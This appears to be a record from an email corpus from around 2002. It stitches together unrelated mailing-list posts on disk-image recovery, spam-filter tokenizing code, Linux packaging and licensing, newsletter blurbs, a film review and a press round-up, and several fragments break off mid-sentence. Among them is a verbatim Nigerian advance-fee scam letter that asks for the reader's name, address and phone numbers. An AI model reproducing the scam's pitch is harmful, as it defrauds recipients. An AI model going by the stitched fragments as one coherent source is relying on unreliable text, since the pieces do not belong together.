4,"Subject: RE: use of base image / delta image for automated recovery from a
","I did something crudely along those lines for VMS VAX maybe 13 years
 ago; there is at least one product that does it for PC though I don't
 recall its name. It is also handy for cases where you have a CD image
 of some filesystem (or some other image of a filesystem) that is
 intrinsically readonly but whose filesystem will not accept (or is
 not graceful) readonly storage. It is also more or less necessary
 if you want to work with WORM file structures, which are older still.
 There have been a number of filesystems for those dating back to the
 early 1980s if not before.
 
 A generic facility of the type you mention is also one way to implement
 snapshots on top of an existing filesystem. The written information
 must (obviously!) be seekable so you can provide the illusion that you
 wrote to the storage. A device level implementation is however perfectly
 adequate.
 
 It does not, of course, distinguish for you what should have been changed
 and what should not. If you truly know a device (or perhaps a partition)
 must not be written, it can be simpler to either return error on writes,
 or to just return a fake success on writes yet discard the data. (NTFS
 lives with the latter strategy just fine from my experiments. I have not
 tried it on extf3 or reiser.) 
 
 BTW, think about your mention of RAID and consider the complexity of
 writing to RAID4 or RAID5...
 I would contend that with cheaper storage these days, it makes little sense
 to use RAID, save for shadowing and possibly striping. Those at least do
 not have the complexity and slowup dangers that higher RAID levels have, and
 there is not a need to save the cost of disk so much where a single disk
 may hold 200 gigs and up. Why not dedicate another whole disk to fault
 recovery
 and lose the complexity and slow write (sometimes) of RAID?

 Subject: use of base image / delta image for automated recovery from
 attacks
 
 
 Hi,
 
 I was inspired by a mode of operation supported by VMWare. You can have a
 base disk image shared by multiple virtual machine (vm) instances. That base
 image is never altered by a vm instance. Instead, each vm instance writes
 changes to its own ""redo"" log. Future hard disk reads from that vm instance
 incorporate both the base image and the appropriate redo log to present the
 current disk image for that specific virtual machine.
 
 This is described here (thanks to Duane for providing this link on the
 honeypots mailing list)
 http://www.vmware.com/support/reference/common/disk_sharing.html
 
 Could this basic concept be used to easily make self-fixing client/server
 applications that efficiently and automatically recover from most attacks,
 even before those attacks have been discovered? Here is what I imagine.
 
 The physical architectures of most production client/server systems are
 layered. For example, your basic web application might have a web server
 running Apache, connected to an application server running some J2EE or .Net
 business logic, connected to a database server for persistence. The only one
 of these whose disk image really should evolve over time is the database
 server, and even here you often put the static RDBMS software on one
 partition and the changeable datafiles on another partition. It is only the
 partition with the volatile datafiles that must be allowed to change from
 one boot to the next. Other paritions may need to be writable for, say, swap
 space, but these changes could be eliminated on each reboot.
 
 When someone cracks this system, they will probably change an image that
 shouldn't be changed. E.g., they might leverage a buffer overflow in IIS or
 Apache to install a trojan or a backdoor on the more exposed web server. But
 what if the web server ran off a base image, writing changes to a ""delta"" or
 ""redo"" partition? And then what if every night it automatically erased the
 redo partition and rebooted? The downtime involved for each machine would be
 minimal, because it is only deleting data - rather than restoring from
 backup. In a system with redundant web servers for load balancing or high
 availability, this could be scheduled in a way such that the system is
 always accessible. This base/redo partition concept could be implemented at
 the same level as a feature of hardware RAID, allowing for greater
 performance, reliability, and hack resistance. This concept could also be
 applied to the application servers, and even the database server partitions
 (except for those partitions which contain the table data files, of course.)
 
 Does anyone do this already? Or is this a new concept? Or has this concept
 been discussed before and abandoned for some reasons that I don't yet know?
 I use the physical architecture of a basic web application as an example in
 this post, but this concept could of course be applied to most server
 systems. It would allow for the hardware-separation of volatile and
 non-volatile disk images. It would be analogous to performing nightly
 ghosting operations, only it would be more efficient and involve less (or
 no) downtime.
 
 Thanks for any opinions,
 Ben

 Case of headers is definitely helpful.  SpamAssassin has a rule for it

 The Philippines suffers from a Spanish-imposed aristocratic landowner
 class, the same as in most of Latin America, with the serf-like
 relationships that go with it.  You have multiple generations of
 peasants/squatters that cultivate and live on the lands almost as a
 human parts of the property package.
 
 The problem in the Philippines is that the landowner class is fading,
 but the peasants are still operating under the old economic assumption
 even though it isn't being imposed on them in most cases.  In a number
 of areas, you have landowners that don't use their lands during bad
 years (i.e. when sugar prices fall too low or some other condition that
 makes planting unprofitable in the global economy) and in some cases
 have all but abandoned them, but when they come back to plant crops
 several years later they find the same peasants living on the fallow
 land as scratch farmers to survive and waiting for the landowner to come
 back and give them something to do.
 
 The government's solution to this was to ""redistribute"" fallow land to
 the peasants that lived on them, and created a number of problems in the
 process.  First of all, it meant that all the agricultural producers had
 to plant crops all the time (profitable or not) or the government would
 seize the land and give it to someone else, which is not economically
 optimal by any means.  Second when they give it to the peasants, they
 use it to become scratch farmers, which is not a particularly productive
 economic activity, and the landowners generally let them do that for
 free when the land is fallow anyway.  Third, the peasants generally
 *prefer* to work for the landowner rather than own the land themselves;
 they make more money, have more opportunities to become middle-class,
 and enjoy a better lifestyle under that arrangement.  So the result of
 all this is that the landowners either run an economically sub-optimal
 agriculture business to protect their lands, or they risk having their
 land seized without compensation and given to the peasants/squatters who
 will gladly sell it back to the plantation owner rather than becoming
 scratch farmers, another economically sub-optimal solution. The only
 real role of the government in this arrangement is to be a drag on the
 economy.
 
 And I don't know about 20 years for land titles in the Philippines.  It
 takes a little longer than in the US (though not much), and you may have
 to bribe someone to make it work well in an expedited manner, but it
 isn't that onerous in the regions I'm familiar with.
 
 Speaking as a former Philippine plantation owner. (Yes, really. On
 Negros and Cebu. Have I led a strange life or what?)

 Yes, you're confused.
 
 A Linux distribution (_any_ Linux distribution) contains lots and lots
 of separate codebases.  Some are under the GNU GPL.  Many are not.  Are
 you clear on this point, now?  This is my second try.  One suspects that
 you actually understand perfectly, but just don't like it.
 
 You're further confused if you think the GNU GPL gives you the right to
 get covered software for free.  It does not.  It provides that _if_
 you've lawfully received a copy of the covered binary version, you have
 rights to also receive the matching source code.
 
 > I don't particularly need support, so I'm not really interested in
 > purchasing a set of disks with 4 billion apps which I'll never use.
 
 Then, if you nonetheless want a SuSE boxed set's contents, the only way
 you can do that without copyright violation _and_ without having to pay
 the purchase price is to get someone to _give_ (not ""lend"" or duplicate) 
 you his copy.
 
 > Yes, thanks for your input. Anyway, I've a friend with 7.3 pro, so
 > I'll just ask him.
 
 Ask him _what_?  If you're asking him to ""lend"" or duplicate his CDs,
 then you'll be ripping off SuSE Linux AG illegally.
 
 Don't like SuSE's product licensing?  Write your own distribution.  You
 can even grab most of what you need _from SuSE_.  All you have to do is 
 heed the licensing terms on the individual pieces.
 
 What, you think that's too much work?  Then, try a different
 distribution.  Clue:  _Not_ one packaged in a retail boxed set.  Even RH
 7.3 retail boxed sets include non-freely redistributable applications on
 the Star office 5.2 CD and the Productivity Applications CD, among
 others.  (The core 3-CD set of the basic RH distribution, on the other
 hand, contains only software that may be freely redistributed, whether 
 open source or not.)

 There is a bit of circumstantial evidence - apparently some MT 
 listers were approached by him (via email) - a little research in 
 dejanews/google groups showed a number of messages from him, clearly 
 hoping to contact girls, appearing in ""alt.teens"" and similar groups -
  I just tried a Google Groups search on ""Robert Moaby"" and some of 
 them came top of the list.
 
 Note for Marie - ""MT"" stands for Mark Thomas, a slightly slimmer, UK 
 version of your Michael Moore - the mailing list is named after him.

 That idea looks good although it maybe needs to be tweaked a bit more (what
 you sent doesn't support packages named ""kernel-smp""). I'd also prefer a
 cleaner way than the env variable, and preferrably not editing the spec...
 probably ""--define 'target 2.4.xx-xx' --with smp"". Sound good enough?
 The BuildRequires on ""kernel-source"" will also need to be removed because
 it won't necessarily need to be true, and that does bug me a bit :-/
 
 More ideas are welcome.
 Matthias

 There's a brief discussion of this before the definition of
 MAX_DISCRIMINATORS.  All clues with prob MIN_SPAMPROB and MAX_SPAMPROB are
 saved in min and max lists, and all other clues are fed into the nbest heap.
 Then the shorter of the min and max lists cancels out the same number of
 clues in the longer list.  Whatever remains of the longer list (if anything)
 is then fed into the nbest heap too, but no more than MAX_DISCRIMINATORS of
 them.  In no case do more than MAX_DISCRIMINATORS clues enter into the final
 probability calculation, but all of the min and max lists go into the list
 of clues (else you'd have no clue that massive cancellation was occurring;
 and massive cancellation may yet turn out to be a hook to signal that manual
 review is needed).  In your specific case, the excess of clues in the longer
 MAX_SPAMPROB list pushed everything else out of the nbest heap, and that's
 why you didn't see anything other than 0.01 and 0.99.
 
 Before adding these special lists, the outcome when faced with many 0.01 and
 0.99 clues was too often a coin toss:  whichever flavor just happened to
 appear MAX_DISCRIMINATORS//2 + 1 times first determined the final outcome.

 I just beat it <wink>:  a tokenization scheme that folds case, and ignores
 punctuation, and strips a trailing 's' from words, and saves both word
 bigrams and word unigrams, turned up a low-probability very long spam with a
 list of 410 0.01 clues and 125 0.99 clues!  Yikes.

 No matter how often it says Zope, it gets only one 0.01 clue from doing so.
 Ditto for ZEO.  In contrast, HTML markup has many unique ""words"" that get
 0.99.  BTW, this is a clear case where the assumption of
 conditionally-independent word probabilities is utterly bogus -- e.g., the
 probability that ""<body>"" appears in a message is highly correlated with the
 prob of ""<br>"" appearing.  By treating them as independent, naive Bayes
 grossly misjudges the probability that both appear, and the only thing you
 get in return is something that can actually be computed <wink>.
 
 Read the ""What about HTML?"" section in tokenizer.py.  From the very start,
 I've been investigating what would work best for the mailing lists hosted at
 python.org, and HTML decorations have so far been too strong a clue to
 justify ignoring it in that specific context.  I haven't done anything
 geared toward personal email, including the case of non-mailing-list email
 that happens to go through python.org.
 
 I'd prefer to strip HTML tags from everything, but last time I tried that it
 still had bad effects on the error rates in my corpora (the full test
 results with and without HTML tag stripping is included in the ""What about
 HTML?"" comment block).  But as the comment block also says,
 
 # XXX So, if another way is found to slash the f-n rate, the decision here
 # XXX not to strip HTML from HTML-only msgs should be revisited.
 
 and we've since done several things that gave significant f-n rate
 reductions.  I should test that again now.
 
 > Are there any minable-but-unmined header lines in your corpus left?
 
 Almost all of them -- apart from MIME decorations that appear in both
 headers and bodies (like Content-Type), the *only* header lines the base
 tokenizer looks at now are Subject, From, X-Mailer, and Organization.
 
 > Or do we have to start with a different corpus before we can make

 I would need different data, yes.  My ham is too polluted with Mailman
 header decorations (which I may or may not be able to clean out, but fudging
 the data is a Mortal Sin and I haven't changed a byte so far), and my spam
 too polluted with header clues about the fellow who collected it.  In
 particular I have to skip To and Received headers now, and I suspect they're
 going to be very valuable in real life (for example, I don't even catch
 ""undisclosed recipients"" in the To header now!).

 Ah!  That explains why the HTML tags didn't get stripped.  I'd again offer
 to add an optional argument to tokenize() so that they'd get stripped here
 too, but if it gets glossed over a third time that would feel too much like
 a loss <wink>.

 I reported on tests I ran with random samples of 220 spams and 220 hams from
 my corpus (that means training on sets of those sizes as well as predicting
 on sets of those sizes), and while that did harm the error rates, the error
 rates I saw were still much better than Jeremy reported when using 500 of
 each.
 
 
 Ah, a full test run just finished, on the
 
    tokenization scheme that folds case, and ignores punctuation, and strips
 a
    trailing 's' from words, and saves both word bigrams and word unigrams
 
 This is the code:
 
             # Tokenize everything in the body.
             lastw = ''
             for w in word_re.findall(text):
                 n = len(w)
                 # Make sure this range matches in tokenize_word().
                 if 3 <= n <= 12:
                     if w[-1] == 's':
                         w = w[:-1]
                     yield w
                     if lastw:
                         yield lastw + w
                     lastw = w + ' '
 
                 elif n >= 3:
                     lastw = ''
                     for t in tokenize_word(w):
                         yield t
 
 where
 
     word_re = re.compile(r""[\w$\-\x80-\xff]+"")
 
 This at least doubled the process size over what's done now.  It helped the
 f-n rate significantly, but probably hurt the f-p rate (the f-p rate is too
 low with only 4000 hams per run to be confident about changes of such small
 *absolute* magnitude -- 0.025% is a single message in the f-p table):

 Lockergnome's Guide to Converting Vinyl LPs to CD is no longer free. 
 Over the last 10 days, almost 4,000 people downloaded the free tome. 
 Of that 4,000, close to half put in a fake e-mail address, resulting 
 in a ridiculous number of bounce messages in my inbox. Add to that 
 the fact that several of the clever individuals used other people's 
 real addresses, which then amounted to complaints of spam from the 
 address owners. It's not worth providing a free service if it causes 
 Lockergnome to be labeled a spammer as a result. The crowning gem was 
 the in-duh-vidual who used the name A** Hole and Chris's personal 
 address to download the PDF. On a more positive note, the guide is 
 <a href=""http://www.gnometomes.com/tome/001962.html"">now available in all six formats</a>,  
 for the minimal price of $5, complete with some additional content 
 based on a couple reader suggestions.
 <p>
 Chris may have an obsession with Peets coffee, but I'll bet he's never 
 been the daily special. On my visit to St. Louis, for the 
 <a href=""http://www.sic.org"">SIC</a>, I 
 started every morning with a walk to the West Port Starbucks. 
 Apparently my morning ritual was a source of entertainment for the 
 employees, which evolved into discussions of a reality based TV show 
 based on the concept of stalking me. I've even got the 
 <a href=""http://www.lockergnome.com/images/jakepics/starbucks.jpg"">incriminating evidence</a> 
 to prove it.
 <p>
 The SIC provided me the opportunity to see some cool updates to a couple 
 titles, in addition to being introduced to some useful audio oriented 
 titles I'd never seen before. Expect a number of reviews over the next 
 several weeks, as well as extensive coverage of last week's events in 
 St. Louis in the annual SIC special issue. Lori managed to score a few 
 more Gnomedex giveaways while we were in attendance, so those of you who 
 sign up will be coming home with even more goodies, which, by the way, 
 aren't of the stressball and pen variety -- we're talking software 
 titles with reg codes.

 <a class=""url"" href=""http://www.dq.com/palm.html"">http://www.dq.com/palm.html</a><p>
 
 Playing games on a PDA has killed plenty of my time spent waiting in 
 airports around the US. With the recent porting of these three classic 
 PC card games from DreamQuest, I've added some of the best in PC 
 entertainment to my arsenal of PDA diversions. Hearts, Spades and Euchre 
 all play in a similar manner to their PC versions, only on a smaller 
 screen. Available for Pocket PC, Palm, and even the Symbian OS, you can 
 play cards against computer opponents or connect to the online game room 
 and challenge other players using any of the games multiple platforms. 
 This is a unique experience currently unavailable for any other pocket games.

 Blending punk rock attitude with country twang makes for a fairly 
 unique musical experience. I saw these guys play a show in Omaha, 
 back in January of this year and was blown away by their stage 
 presence. Rexway rip through an opening set with enough energy to 
 kick-start even the most somber crowd, moving everyone in the 
 audience to their feet and setting the scene for an entertaining 
 evening. As with most punk, the lyrics are equal parts politics 
 and angst, with enough colorful language to drop a jaw or two. 
 Tool fans should check out the countrified version of the classic 
 HWAP; it's kind of like a cover tune, only more unique. If you 
 are offended by 4-letter words, this band isn't for you.

 In disembodied first person Clockwork style narration,  Croupier
 pessimistically compares our lives to those of hapless casino gamblers.
 We know the odds are stacked against us, yet we continue to play the
 games. Gamblers, or ""punters"" as they are more derogatorily known,
 however, play their games under the watchful eyes of the croupier
 (casino dealer).  Constantly pulled by the siren song of fast money, the
 croupier knows better than anyone that to play is to lose. Thus, the
 cool croupier relegates himself to his addiction of watching others
 lose. Jack Manfred (Clive Owen) is the croupier, raised by his croupier
 father (Nicholas Ball) who taught him all the tricks of the trade.
 Through his losses both in the casino and in his personal life, Jack's
 father also taught Jack that the only way to win is not to play. Punters
 are sorry sods; the croupier is king. From father to son, the lesson
 passes -- watching others strive and falter is the only real enjoyment
 in life. Despite decades of croupier training, Jack is compelled to
 write the great novel burning deep inside him, yearning to escape.
 Jack's publisher regrettably relates to Jack that his novel idea is
 trite; stories of real life graft and corruption are what sell. When
 Jack's father informs Jack of a casino opening in a small London Casino,
 Jack snatches the opportunity to parlay his skill into a novel exposing
 the seedy underbelly of London's casinos. Unfortunately, Jack's ex-cop
 girlfriend sees the job hardening and irreparably changing Jack for the
 worst. In an attempt to fool himself, Jack creates alter ego ""Jake"" to
 bear the brunt of inequity, attempting to maintain Jack both morally and
 physically unscathed. The absence of any clear delineation between the
 personas becomes apparent when a lovely punter (Alex Kingston)
 approaches Jack with a scheme to rob the casino. Jack slowly comes to
 the realization that no one can have it both ways, either in the casino
 or in life. You are either in the game, or you are not. Seasoned veteran
 director Michael Hodges deftly crafts this tale around the subtle
 talents of the ultra cool Clive Owen. Owen rules this drama, not with
 flex and volume, but with glances and nods. Less is truly more, much
 more, in this low budget escape from the unsatisfying blockbuster
 suspense films of recent memory. Croupier proves that it is not a large
 budget, but direction, dialogue and acting that drive the genre.

            talking up at the podium, sometimes you leave a few details
            out. Doom 3 multiplayer will be fully scalable. It will be a
            peer to peer system. We haven't started working on it yet.
            Tell everyone not to panic - it will be fine. John just forgot
            to mention it'll be scalable past four players. It's hard to
            give a hard number because we haven't started working on
            it yet. Right now we're focused on making Doom 3 a
            kickass, over the top single player game.""

","The pay's not good (9,300 a year), but there is insurance, a 4,700 (I 
 think) off a student loan, or for future education, and non-compete status 
 for any govt. job after a year's service.  I moved to New Orleans 
 yesterday, and I should be flying to DC in about a month to start the 
 AmeriCorps training.  I'll be setting up a community technology center which 
 will be used to teach computer literacy skills to low income folks (just, 
 like, learning MS shit (yeah yeah, wtf am i doing?  I know.))  so that 
 they can possibly find better jobs.  I'm sure I'll be doing all sorts 
 of other things too, like helping folks with their taxes, writing grants, 
 etc.  The website is www.americorps.org.  There are -all- sorts of jobs 
 all over the country, so if someone out there can survive on the small 
 salary, it's something s/he might want to take a look at.  
 
 Since Xi is in college and getting grants + scholarship + child support 
 from dad, my load has gone down terrifically.  The IRS is after me for 
 money I didn't make on the stock market, so it's a way to at least get 
 into a situation where they will have to understand that yes, they will 
 have to wait.  
 
 But bottom line benefit and motivation is the feelgood that ya get when 
 you do this type of job.  I'm up for some of that.

 worms. If you update your antivirus software on a regular basis,
 these new versions of Frethem and Yaha shouldn't be a nuisance.
 But if you haven't updated in a while, these variants--plus the
 continuing threat of Klez.h--should motivate you. In security
 news, a flaw in certain versions of PGP encryption could affect
 Outlook users. Read on to learn whether you're vulnerable.

 <P>
 No. Many new viruses do not require a PC-based e-mail client such
 as Outlook in order to spread. These new viruses, including 
 Klez, have their own e-mail client (SMTP) and can find e-mail
 addresses within cached Web pages on an infected machine,
 bypassing the need to use Outlook's Address Book. Larger
 Web-based e-mail services, such as Hotmail and Yahoo Mail, screen
 mail hosted on their sites for viruses, but there's no beating
 having a good antivirus product on your desktop just in case.

 Oh, OK. That doesn't make sense. :) Can someone manually remove/revoke

 Can someone please tell me what a ""pitch"" constitutes? I have an idea 
 it is somewhat like the spots street musicians claim, but this sounds 
 more formal.
 ------------------
 Just an area of the beach by the prom where he's allowed to make his
 sculptures.
 Weymouth is where I spent my teenage years. My mum and one sister still live
 there.
 So I'm pretty familiar with the sculptures; pretty impressive, and very big.
 (I think he uses some sort of armature for some bits - it's not just sand)
 They usually get vandalised, though; after a lot of drinks, it obviously is
 a good idea to break into the enclosure and kick all the sculptures to bits.
 Then again, Weymouth is pretty run down, and attracts holiday makers of the
 worst sort.

 They don't have to.  All they have to do is use some program (which, if
 they don't exist already, will certainly be around someday soon) that makes
 every spam they send show the recipient as the ""from"" address as well.

 The adding manually thing doesn't seem like much fun.  And, anytime I speak
 to someone new, it just makes it more unlikely that they will be willing to
 contact me.  Having played around with whitelists in the past, you'd be
 amazed at how confused many people get by them as well.  They tend to
 ignore the ""please apply"" messages.
 
 As an aside, am I the only person around who simply does not use the
 addressbook feature in email programs?  I never have, and I don't see any
 reason to.  It (along with not opening attachments) has helped me not to
 send out viruses to people.  I generally use my own brain or my inbox as an
 addressbook, and search out the last email I received from someone and hit
 reply...

 Well, yes.  *I* use one email address, but that doesn't mean all my friends
 do.  You would need to convince everyone I know of that.  Most people I
 know, at the very least, have a home and work email address.  But plenty
 others have other addresses for various reasons.  Keeping track of all of
 them for a whitelist seems like a pain.  It forces them to remember which
 email addresses are already approved and avoid using others.
 
 Plus, I know plenty of people who change jobs, and suddenly get a new email
 address from their new job.  Wouldn't it suck if, in sending out your new
 job info, you had to fill out a new application for each friend just to
 tell them about your new job email address?

  Ah, they told me that about my A1200. Just got a video box, cut air holes
 and a hole for the cables, then got an extra-long 2.5"" to 3.5"" IDE cable,
 and connected it up. Had to make a few holes in the A1200 case for the
 IDE cable too.
 
  Worked a charm. Until I dropped the disk one day onto concrete.

 Well, with 7.0, I've seen a few problems with doing that, but as of 7.2
 it's really wonderful! Ever tried of completely uninstalling all openssh
 related packages while being connected through ssh? Well, it works!!!! Of
 course, if the connection cuts at that moment, you're stuck, but a simple
 upgrade with official Red Hat packages also works like a charm :-)

 This wouldn't be worth the effort involved IMHO, and would probably end up
 in relative breakage of a few systems if not carefully tested.
 Your first example is a good one, because I really think it's even easier
 currently :
 1. Leave your current kernel as-is
 2. Get the ""alsa-driver"" source rpm
 3. Rebuild and install resulting packages
 
 Drivers that are written to be easily compiled as modules (like ltmodem,
 NVidia, ALSA etc.) can easily be repackaged separately as rpms and ported
 as easily for various kernel rpms from the source rpm.
 
 Also, what you describe is sort of the opposite of what rpm packaging is in
 my mind. I see it more as a ""one size fits all"" achievement in the general
 case. And kernel isn't an exception (although there are packages optimized
 for various processors) since they all come with just about all the modules
 you'll ever need. Make that ""one size fits many"" then if you want ;-)
 
 Last but not least : The kernel is something I'm trying to keep away from
 in my packaging since I really don't want to see newbies screwing up their
 systems because of packages on my website... same goes for GNOME, KDE and
 other major bits of the distribution since I also want people who happily
 use my packages to be able to upgrade to the next Red Hat Linux release
 without having their system turned into another Ximian mess.

 PS: Yes Chris, I'm worried about not giving you too much work! Less in fact

 If you use spamd with the -H option and provide a shared directory for

 Loo rolls of honour and the invisible man
 
 Paper Clips: A round-up of the weekly press
 
 By Steven McCaffery
 
 The powers-that-be tell us that crime does not pay. And they found an 
 ally in the Ulster Herald this week, which carries a cautionary tale 
 for anyone thinking of embarking on a criminal career. The 
 Omagh-based paper's 'As the Man Says' column brings a story which 
 originated in the Middle East.
 
 ""A gent recently attempted to rob a bank in Tehran,"" the columnist reports.
 
 ""He was unarmed and began seizing bank notes from customers' hands.""
 
 It is then explained: ""He had paid 625 to a local sorcerer and 
 believed that he was invisible.""
 
 In the Lurgan Mail there was also news of a dramatic robbery.
 
 ""A Lurgan newsagent has told how thieves drilled their way through 
 three walls to steal 10,000 worth of cigarettes recently in an 
 attack which was well planned and professional,"" the paper reports.
 
 ""The thieves broke through the back wall of a religious gifts shop 
 next door to the newsagents and then drilled through the partition 
 between the back hallway and the front shop.
 
 ""Moving statues of religious icons out of the way, the gang then 
 drilled into the back of the newsagent's cigarette stand removing the 
 contents.""
 
 The owner of the Paper Chase shop is pictured next to the gaping hole 
 left in his store and is quoted as saying: ""On Monday morning when my 
 wife was opening, everything looked normal.
 
 ""But when she opened the shutters she found herself looking into the 
 shop next door.""
 
 The paper reports that the shop was the target of ""another well 
 organised crime"" 12 weeks ago when thieves escaped with a safe.
 
 The shop's owner says: ""The closer it gets to Christmas the more 
 people are going to be open to this.""
 
 The issues of crime and punishment are tackled by a columnist in the 
 Down Democrat.
 
 Writing in the Downpatrick-based newspaper John Coulter calls on the 
 authorities to ""birch the vandals"" plaguing the local community.
 
 He is shocked at reports of the ""wanton destruction by vandals"" and 
 issues a call for action.
 
 ""The time has come to fight fire with fire,"" he writes, ""before 
 unemployed paramilitaries decide to impose vigilante rule and start 
 using so-called kangaroo courts to dish out their own brand of 
 sentences on those found 'guilty' of anti-social behaviour.""
 
 As an alternative to such reckless violence, he recommends, 
 controlled violence.
 
 ""It was a sorry day that the Manx authorities banned the use of the 
 birch as a weapon in dealing with unruly elements of the Isle of Man.""
 
 Getting his defence in early, he immediately rounds on any woolly 
 liberal who may oppose his plan.
 
 ""In many Islamic countries, public flogging of convicted criminals is 
 the order of the day.
 
 ""You might laugh and say there is little chance of such measures 
 being introduced in the United Kingdom or Ireland given that corporal 
 punishment was abolished in the vast majority of northern schools in 
 the late 1980s.
 
 ""However, people seem to forget that Islam is the fastest growing 
 faith on the British mainland and it's only a matter of time before 
 it numerically passes Christianity.""

 This is a good point. There are a lot of alternatives to hydrocarbon
 products derived from petroleum, but these have often been developed as
 a replacement for petroleum after the technology has been established -
 there is a growing industry in plant-derived plastics and lubricants,
 but this is to replicate materials that have been previously created 
 much more easily within the petrochemical industry.
 
 Vegetable-derived lubricants have been used. The Russians used sunflower
 oil in the lubrication systems of tanks and trucks during the second world 
 war, and work is being done in the UK to produce diesel fuel derived from
 waste cooking oil from fast-food restaurants. 
 
 Jay's correct in his opinion that vegetable oil is not as durable as 
 petroleum oil, but this is only because of the lack of sophistication 
 of the chemistry involved. Synthetic fuels and lubricants are continuously
 being developed, and I don't see any problems with synthetics ultimately 
 matching the performance of the more conventional products. As the rock
 oil runs out, plant oil derivatives *will* be developed to fill the
 gap. In parallel, changes will occur in the designs of the machines to 
 cope with any changes in performance of the lubricants.
 
 My big concern is if the technology were ever to be lost for some reason.
 Re-creating a petrochemical industry from scratch without petrochemicals
 (that is, going immediately to plant-based synthetics) would be extremely 
 difficult, especially if it were necessary to recreate *all* of the
 petrochemical-derived products (not just lubricants and fuels). I suspect
 that, bearing in mind the ingenuity of the human race, it would happen,
 just at a different pace. Imagine an industrial revollution based on,
 for example, methane from pig manure, or diesel oil from sunflowers.
 
 All we would then have to do is get used to all the machines smelling
 like pig farms and fish and chip shops...

 Have done exactly this with debian, only I used a PCMCIA network card and
 did it off ftp.esat.net (ucd bandwidth is rather good).
 
 However, if you've another machine, look into this null modem cable jobby:
 
 http://rosebud.sps.queensu.ca/~edd/t100cs.html
 
 whether you can connect that to direct cable connectionI've no idea.  You
 could however, put the files onto windows, boot onto a ILUG BBC[tm] and
 mount the fat32 partition.
 
 Easier/Quicker way is to get your hands on a PCMCIA nic.  Also makes the
 maptop far more useful in the long run.

 The problem is the problem you're trying to solve is never the same. Java
 will soon suffer API-rot (alot of poeple are already complaining about it),
 it's just new. C was clean in the beginning too. API-rot is PURELY a
 function of age.

 I do this all the time, It's alot easier then you think if the original
 programmer had a clue at all... Java does remove the clue requirement tho,
 just adds a huge testing requirement, QA guys aren't as cheap ;)

 No it's not, but you can hire teams of Javites for cheap at your local high
 school. Java is about cutting costs and commoditizing programming - and it's
 working!

 I'm confused. I thought it was GPL'ed and

 I don't particularly need support, so I'm not

 I have one that uses dist to send stuff from my work mail to my 
 home mail.  The binding looks like this:
 
 set {bindings(key,HD_Dist_Silently -form distcomps.to-me)} <Meta-dollar>
 
 The ""HD_Dist_Silently"" is a hacked up version of the proc that 
 does dist in exmh and is pasted in below.  It's getting old and 
 probably should be ""resynced"" with the current code.  But it 
 still works (on a relatively recent CVS copy of exmh)
 
 It's also possible that there's an easier way but I hacked this 
 together quickly a year or more ago and when it worked I moved 
 on to other tasks.
 
 --Hal
 
 proc HD_Dist_Silently { args } {

 SENIOR ADVOCATE OF NIGERIA 
 BARR. WILLIAMS FALANA (SAN)
 
 Dear Sir, 
 
 I am Barrister Williams Falana a member of Nigeria Bar 
 Association (NBA).Your contact reached me through the World 
 Business Encyclopaedia.Hence,I made up my mind to introduce 
 this business to you in confidence for the mutual benefit 
 of both of us. 
 
 The sum of USD48M (Forty eight Million United States) was 
 lodged into a security company here in the Country by the 
 late Head of State (GEN.SANI ABACHA) for safe-keeping. This 
 money was lodged in security vaults / boxes and labelled as
 personal belongings and as such the security company does 
 not know the true content of the boxes.This money was 
 originally meant to be used for his political campaign. 
 Because I was his family Attorney as such he confided in me 
 with the relevant document papers relating to this deposit 
 before he died of cardiac arrest.
 
 As a matter of fact we have concluded all arrangement with 
 an offshore Security Company to move this money as a 
 consignment through diplomatic means to their offshore 
 affiliated office where you will be required to put claim 
 to the consignment as the bonafide beneficiary of the 
 consignment. You should know that this business is safety 
 and 100% risk-free as it does not involve drug money or 
 Terrorist fund.
  
 If you are interested to carry out this transaction with 
 me, 20% will be for you for your assistance, 5% for general 
 expenses, and 75% for us.
 
 You are required to send by e-mail immediately your Full 
 name and Address, which I will use to draft an agreement 
 that will guide and protect both of us in this transaction 
 also which will be used to effect the change of ownership 
 of the consignment to your name as the beneficiary of the 
 consignment.
 
 Also send me your Telephone and Fax numbers for easy 
 communication
  
 Once you notify me your willingness by sending the above 
 requirement.This transaction will be concluded within 7 
 (seven) working days.
 
 I will be waiting for your urgent reply.You can reach me on 
 my Cell Telephone No: 234-80- 33055024 or my alternative E-
 mail: williamsfalana@caramail.com 
 
 Best regards, 
 Barrister Williams Falana {SAN}

 No, in my opinion, it's purely a bug in SA (or the libraries we use,
 which is the same thing) that we don't handle outages of network
 services better.
 
 The rule is useful and it does help reduce spam, we should keep it.  I
 have a feeling the DNSBL rules will cluster a bit more heavily around
 the 1.0 to 2.0 range once we start using the new GA on them.
 
 Also, 0.77 was a slightly conservative number.  Since I didn't have
 real-time data, I typically used the lower or median number of different
 periods (most recent month, two months, six months), depending on the
 trend of the period data (better performance for recent messages ->
 favor recent scores, worse performance for recent messages -> favor
 lowest scores, never pick the highest number unless the rule was very
 accurate and the highest number was for the most recent data).

 Rebranding: taking something and changing nothing about it except its name. 
 In the UK Marathon bars became Snickers bar, Jif cleaning fluid became Cif 
 and Talking Stick became Secret Chiefs, y'know?

","Rohit forwards from the NYT:
 > Bigger Bar Code Inches Up on Retailers
 > August 12, 2002
 > By KATE MURPHY 
 
 I can't imagine why they're inching forward through 
 13- and then 14- digit extensions; seems they should
 just leap ahead to something with real headroom, say
 40-digit numbers (128 bits or more). 
 
 How hard can it be to widen the glyph area and 
 narrow the bars? The sensors have got to be tens
 or even hundreds of times more accurate/robust 
 than when barcodes first took off.
 
 One segment of the article along these lines:

 A newly *patented* bar code, that merely fits 14 digits
 into less space? I sure hope there's more to this
 ""invention"" than ""more lines, and narrower"". 
 
 They might as well go 2-D to fit in lots of extra bits,
 which could also ease the transition to the capacity 
 radio-transponder tags may offer.
 
 A bunch of info on different barcode standards, including
 2-D variants, with examples is at:
 
 http://www.makebarcode.com/specs/speclist.html
 
 Something very much like a 2-D barcode is Xerox ""Dataglyphs"":

 I've very excited about the in-planning Penguin Shell volunteer project. 
 Apparently, you are too. I've received more than 100 emails from readers <a 
 href=""mailto:tony@lockergnome.com?subject=Penguin Shell Volunteer 
 Skills"">volunteering</a> a wide range of IT skills for charitable organizations. 
 
 
 
 
 Linux users, Windows users, even a few Mac users are ready, willing and able to 
 spend their own precious off time providing qualified technical skills for a 
 good cause. I've also gotten more than two dozen suggestions for <a 
 href=""mailto:tony@lockergnome.com?subject=Penguin Shell Organization 
 Suggestion"">organizations</a> that might be in need of such skills. And, I've 
 seen some very interesting suggestions for <a 
 href=""mailto:tony@Lockergnome.com?subject=Penguin Shell Volunteer name 
 suggestion"">names</a> for our project. Feel free to click through on any of the 
